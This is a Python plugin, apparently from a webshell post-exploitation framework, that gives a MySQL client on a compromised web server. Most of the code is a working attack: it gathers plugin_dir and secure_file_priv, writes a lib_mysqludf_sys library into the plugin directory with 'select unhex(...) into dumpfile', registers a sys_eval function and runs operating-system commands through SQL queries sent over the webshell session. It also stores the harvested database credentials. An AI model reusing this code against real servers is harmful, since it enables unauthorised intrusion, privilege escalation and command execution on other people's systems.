from typing import Union
from api import Session, logger, tablor, colour, Command, Cmdline, CommandReturnCode, CommandExecutor, Plugin, CommandType, utils
import argparse
import json
import base64
import re
import os

def get_plugin_class():
    return MysqlClientPlugin

class MysqlClientPlugin(Plugin, Command, CommandExecutor):
    name = 'mysql'
    description = '实现mysql客户端功能'
    command_name = 'mysql'
    command_type = CommandType.POST_COMMAND

    def __init__(self):
        self.parse = argparse.ArgumentParser(prog=self.command_name, description=self.description, epilog="在进行SQL查询前，你需要先进行一次连接")

        query_group = self.parse.add_argument_group('查询选项')
        query_group.add_argument('-i', '--interactive', action='store_true', help="进入简单交互模式执行SQL语句")
        query_group.add_argument('sql', nargs='?', help="sql语句.")

        state_group = self.parse.add_argument_group('状态选项')
        state_group.add_argument('-c', "--connect", help="进行一次连接测试", action='store_true')
        state_group.add_argument('-H', '--host', help="设置当前数据库主机地址.")
        state_group.add_argument('-P', '--port', help="设置当前数据库服务端口")
        state_group.add_argument('-u', '--user', help="设置当前数据库用户名.")
        state_group.add_argument('-f', '--exec-func', help="设置当前用于命令执行的UDF函数名.")
        state_group.add_argument('-p', '--password', help="设置当前数据库用户的密码.")
        state_group.add_argument('-d', '--database', help="设置当前使用的数据库库名")
        state_group.add_argument('-s', '--show', help="显示当前数据库连接信息", action='store_true')

        cmd_group = self.parse.add_argument_group('命令执行选项')
        cmd_group.add_argument('-e', '--exec-cmd', help="使用SQL存储过程执行指定的系统命令（首先得上传udf）.")
        cmd_group.add_argument('--exec-udf', help="尝试上传命令执行的UDF文件，命令执行函数为`sys_eval`", action="store_true")

        self.help_info = self.parse.format_help()

        self._host = 'localhost'
        self._port = 3306
        self._user = 'root'
        self._password = ''
        self._current_database = ''
        self._exec_func = 'sys_eval' # 指定执行命令的函数
        self._last_connect_status = False

    def on_loading(self, session: Session) -> bool:
        return super().on_loading(session)

    # def _upload_lib(self, ret:EvalResult)-> EvalResult:
    #     '''上传可能缺失动态库
    #     '''
    #     if isinstance(self.session.client, CSharpWebshell):
    #         assems = []
    #         path = self.session.server_info.tmpdir+self.session.server_info.sep+utils.randomstr(8)
    #         for e in ret.errors:
    #             if e.errcode == "CS0246" and 'MySql' in e.errmsg:
    #                 assems.append(path)
    #                 break
    #         if path in assems:
    #             logger.info("Try to upload MySql.Data.dll !")
    #             if self.session.exec(['upload', os.path.join(os.path.dirname(__file__), 'extra_code', 'MySql.Data.dll'), path]) == self.SUCCESS:
    #                 assems.extend(self.session.client.options.extra_assemblys)
    #                 self.session.client.options.set_temp_option('extra_assemblys', str(assems))
    #                 ret = self.evalfile('payload/connect', host=self._host, port=self._port, user=self._user, 
    #                     password=self._password, database=self._current_database)
    #                 self.session.exec(['rm', '-f', path], False) # 删除临时文件

    #     return ret

    def _connect(self)-> CommandReturnCode:
        ret = self.session.evalfile('payload/connect', dict(host=self._host, port=self._port, user=self._user, 
            password=self._password, database=self._current_database))
        if ret is None:
            logger.error('连接错误!')
            return CommandReturnCode.FAIL
        ret = json.loads(ret)
        if ret['code'] == -1:
            msg = base64.b64decode(ret['msg'].encode()).decode(self.session.options.get_option('encoding').value, 'ignore')
            logger.error('连接失败!')
            logger.error(msg)
            self._last_connect_status = False
            return CommandReturnCode.FAIL
        elif ret['code'] == 1:
            logger.info('连接成功!', True)
            self._last_connect_status = True
        elif ret['code'] == 0:
            logger.error("无法使用函数`mysqli_connect`,服务器似乎未开启Mysqli扩展.")
            self._last_connect_status = False
            return CommandReturnCode.FAIL
        return CommandReturnCode.SUCCESS

    def _show(self)-> CommandReturnCode:
        table = [
            ['Host', self._host],
            ['Port', self._port],
            ['User', self._user],
            ['Password', self._password],
            ['Current database', self._current_database],
            ['Execute Function', self._exec_func],
            ['Last connection', colour.colorize('成功', 'bold', 'green') if self._last_connect_status else colour.colorize('失败', 'bold', 'red')]
        ]
        print(tablor(table, False, indent=''))
        return CommandReturnCode.SUCCESS

    def exec(self, cmd: bytes) -> Union[bytes, None]:
        encoding = self.session.options.get_option('encoding').value
        encode_cmd = cmd.hex()
        sql = f"select {self._exec_func}(unhex('{encode_cmd}'))"
        ret = self.session.evalfile('payload/query', dict(host=self._host, port=self._port, user=self._user, 
            password=self._password, database=self._current_database, sql=sql))
        if ret is None:
            return None
        ret = json.loads(ret)
        if ret['code'] == 1:
            if ret['result']:
                r = [base64.b64decode(t[0].encode()).decode(encoding, 'ignore') for t in ret['result']]
                return '\n'.join(r[1:]).encode()
            return b''
        return None


    def _query(self, sql: str)-> CommandReturnCode:
        ret = self.session.evalfile('payload/query', dict(host=self._host, port=self._port, user=self._user, 
            password=self._password, database=self._current_database, sql=sql))
        if ret is None:
            return CommandReturnCode.FAIL
        ret = json.loads(ret)
        encoding = self.session.options.get_option('encoding').value
        if ret['code'] in (0, -1):
            msg = base64.b64decode(ret['msg'].encode()).decode(encoding, 'ignore')
            print(msg)
            if ret['code'] == -1:
                self._last_connect_status = False
                return CommandReturnCode.FAIL
            return CommandReturnCode.PARTIAL_SUCCESS
        elif ret['code'] == 1:
            result = []
            for row in ret['result']:
                tmp = []
                for val in row:
                    val = base64.b64decode(val.encode()).decode(encoding, 'ignore')
                    tmp.append(val)
                result.append(tmp)
            print(tablor(result, indent=' '))
            logger.info(colour.colorize(f"{len(result)-1} rows in set.", 'bold'))
        elif ret['code'] == 2:
            affected = ret['affected']
            logger.info(colour.colorize(f"Query OK, {affected} row affected.", 'bold'))
        elif ret['code'] == -2:
            logger.error("无法使用函数`mysqli_connect`,服务器似乎未开启Mysqli扩展.")
            self._last_connect_status = False
            return CommandReturnCode.FAIL

        self._last_connect_status = True
        return CommandReturnCode.SUCCESS

    def _interactive(self)-> CommandReturnCode:
        logger.info("这仅仅为了循环执行SQL语句，不是真正的交互式SQL shell. ")
        logger.info("键入`exit`或`quit`或`Ctrl-C`来退出")
        try:
            while True:
                prompt = colour.colorize('mysql', 'underline')+'('+colour.colorize(f"{self._user}@{self._host}", fore='green')+')'+\
                    f" [{colour.colorize(self._current_database, fore='yellow')}] > "
                sql = input(prompt)
                if sql == '':
                    continue
                elif sql in ('exit', 'quit'):
                    break
                elif sql == 'clear':
                    self.session.call_command(Cmdline('clear'))
                    continue
                elif sql.startswith('use '):
                    match = re.fullmatch(r'use\s+(\w+)', sql)
                    if match:
                        old = self._current_database
                        self._current_database = match.group(1)
                        if self._query(sql) == CommandReturnCode.PARTIAL_SUCCESS:
                            self._current_database = old
                    continue
                self._query(sql)
        except KeyboardInterrupt:
            print('')
        return CommandReturnCode.SUCCESS

    def _exec_udf(self)->CommandReturnCode:
        '''上传mysql的udf用于命令执行
        '''
        encoding = self.session.options.get_option('encoding').value
        # 验证是否存在当前用于执行命令的函数
        sql = f"select * from mysql.func where name = '{self._exec_func}'"
        ret = self.session.evalfile('payload/query', dict(host=self._host, port=self._port, user=self._user, 
            password=self._password, database=self._current_database, sql=sql))
        if ret is None:
            logger.error("查询命令执行函数信息失败!")
            return CommandReturnCode.FAIL
        ret = json.loads(ret)
        if ret['code'] == 1:
            if ret['result'] and len(ret['result'])>1:
                logger.info(f"UDF命令执行函数`{self._exec_func}`已经存在!", True)
                return CommandReturnCode.SUCCESS
        else:
            logger.error("查询命令执行函数信息失败!")
            return CommandReturnCode.FAIL

        # 搜集信息
        logger.info("数据库信息收集中...")
        plugin_dir = None
        secure_file_priv = None
        version_compile_machine = None
        version_compile_os = None
        version = None
        sql = "show global variables where variable_name in ('secure_file_priv', 'plugin_dir', 'version_compile_machine', 'version_compile_os', 'version')"
        ret = self.session.evalfile('payload/query', dict(host=self._host, port=self._port, user=self._user, 
            password=self._password, database=self._current_database, sql=sql))
        if ret is None:
            logger.error("数据库信息收集失败!")
            return CommandReturnCode.FAIL
        ret = json.loads(ret)
        if ret['code'] == 1:
            if ret['result']:
                r = [base64.b64decode(t[1].encode()).decode(encoding, 'ignore') for t in ret['result']]
                plugin_dir = r[1]
                secure_file_priv = r[2]
                version = r[3]
                version_compile_machine = r[4]
                version_compile_os = r[5]
            else:
                logger.error("数据库信息收集失败!")
                return CommandReturnCode.FAIL
        elif ret['code'] in (0, -1):
            msg = base64.b64decode(ret['msg'].encode()).decode(encoding, 'ignore')
            print(msg)
            return CommandReturnCode.FAIL
        else:
            logger.error("数据库信息收集失败!")
            return CommandReturnCode.FAIL
        logger.info(f"plugin_dir: {plugin_dir}", True)
        logger.info(f"secure_file_priv: {secure_file_priv}", True)
        logger.info(f"version: {version}", True)
        logger.info(f"version_compile_machine: {version_compile_machine}", True)
        logger.info(f"version_compile_os: {version_compile_os}", True)
        v = re.search(r'(\d+)\.(\d+)', version)
        if v is not None and 'win' in version_compile_os.lower():
            m = int(v.group(1))
            c = int(v.group(2))
            if (m==5 and c<1) or m<5:# Windows上mysql<5.1
                logger.info(f"mysql在{version_compile_os} {version_compile_machine}上的版本小于5.1, 你可以手动上传udf文件到c:\winnt\system32或c:\windows\system32目录下!")
                return CommandReturnCode.SUCCESS
        
        # 写入udf
        arch = '32'
        ext = 'so'
        if '64' in version_compile_machine:
            arch = '64'
        if 'win' in version_compile_os.lower():
            ext = 'dll'
        local_udfpath = os.path.join(os.path.dirname(__file__), 'extra_code', f'lib_mysqludf_sys_{arch}.{ext}')
        logger.info(f"选中udf文件`{local_udfpath}`")
        udfdata = b''
        with open(local_udfpath, 'rb') as f:
            udfdata = f.read()
        udfdata = udfdata.hex()
        udfname = utils.random_str(8)+'.'+ext
        udfpath = plugin_dir+udfname
        if secure_file_priv and secure_file_priv != plugin_dir:
            logger.error("无法上传UDF文件，因为secure_file_priv字段!")
            if input("你想尝试使用web权限上传吗?(y/n) ").lower() == 'y':
                if self.session.call_command(['upload', local_udfpath, udfpath])==CommandReturnCode.SUCCESS:
                    logger.info("UDF写入成功!", True)
                else:
                    logger.error("UDF写入失败!")
                    return CommandReturnCode.FAIL
            else:
                return CommandReturnCode.FAIL
        else:# 使用sql语句写入UDF
            logger.info(f"开始写入UDF`{udfpath}`...")
            sql = f"select unhex('{udfdata}') into dumpfile '{udfpath}'"
            ret = self.session.evalfile('payload/query', dict(host=self._host, port=self._port, user=self._user, 
                password=self._password, database=self._current_database, sql=sql))
            if ret is None:
                logger.error("UDF写入失败!")
                return CommandReturnCode.FAIL
            ret = json.loads(ret)
            if ret['code'] == 2:
                logger.info("UDF写入成功!", True)
            elif ret['code'] in (0, -1):
                msg = base64.b64decode(ret['msg'].encode()).decode(encoding, 'ignore')
                print(msg)
                logger.error("UDF写入失败!")
                return CommandReturnCode.FAIL
            else:
                logger.error("UDF写入失败!")
                return CommandReturnCode.FAIL
        
        # 创建命令执行函数
        sql = f"create function {self._exec_func} returns string soname '{udfname}'"
        ret = self.session.evalfile('payload/query', dict(host=self._host, port=self._port, user=self._user, 
            password=self._password, database=self._current_database, sql=sql))
        if ret is None:
            logger.error(f"创建函数`{self._exec_func}`失败!")
            return CommandReturnCode.FAIL
        ret = json.loads(ret)
        if ret['code'] == 2:
            logger.info(f"创建函数`{self._exec_func}`成功!", True)
            self._query(f"select * from mysql.func where name = '{self._exec_func}'")
            return CommandReturnCode.SUCCESS
        elif ret['code'] in (0, -1):
            msg = base64.b64decode(ret['msg'].encode()).decode(encoding, 'ignore')
            print(msg)
            logger.error(f"创建函数`{self._exec_func}`失败!")
            return CommandReturnCode.FAIL
        else:
            logger.error(f"创建函数`{self._exec_func}`失败!")
        return CommandReturnCode.FAIL

    def run(self, args: Cmdline)-> CommandReturnCode:
        args = self.parse.parse_args(args.options)
        ret = CommandReturnCode.SUCCESS
        if args.host is not None:
            self._host = args.host
            if not args.connect:
                logger.info(f"Set host => {args.host}")
        if args.port is not None:
            self._port = args.port
            if not args.connect:
                logger.info(f"Set port => {args.port}")
        if args.user is not None:
            self._user = args.user
            if not args.connect:
                logger.info(f"Set user => {args.user}")
        if args.password is not None:
            self._password = args.password
            if not args.connect:
                logger.info(f"Set password => {self._password}")
        if args.database is not None:
            self._current_database = args.database
            if not args.connect:
                logger.info(f"Set current_database => {self._current_database}")
        if args.exec_func is not None:
            self._exec_func = args.exec_func
            logger.info(f"Set exec_func => {self._exec_func}")

        if args.connect:
            ret = self._connect()
        elif args.show:
            ret = self._show()
        elif args.interactive:
            ret = self._interactive()
        elif args.exec_udf:
            ret = self._exec_udf()
        elif args.exec_cmd:
            r = self.exec(args.exec_cmd.encode())
            if r is not None:
                print(r.decode(self.session.options.get_option('encoding'), 'ignore'))
            else:
                logger.error(f"执行系统命令`{args.exec_cmd}`失败!")
                ret = CommandReturnCode.FAIL
        elif args.sql:
            ret = self._query(args.sql)
        else:
            ret = self._show()

        return ret
    

    def on_loaded(self):
        data = self.session.load_json("mysql-config")
        if data is None:
            return
        self._host = data.get('host', 'localhost')
        self._port = data.get('port', 3306)
        self._user = data.get('user','root')
        self._password = data.get('pwd', '')
        self._exec_func = data.get('exec_func', 'sys_eval')
        self._current_database = data.get('database', '')
        
    def on_destroy(self):
        data = {
            'host':self._host, 
            'port':self._port,
            'user':self._user,
            'pwd':self._password,
            'exec_func':self._exec_func,
            'database':self._current_database
        }
        self.session.save_json('mysql-config', data)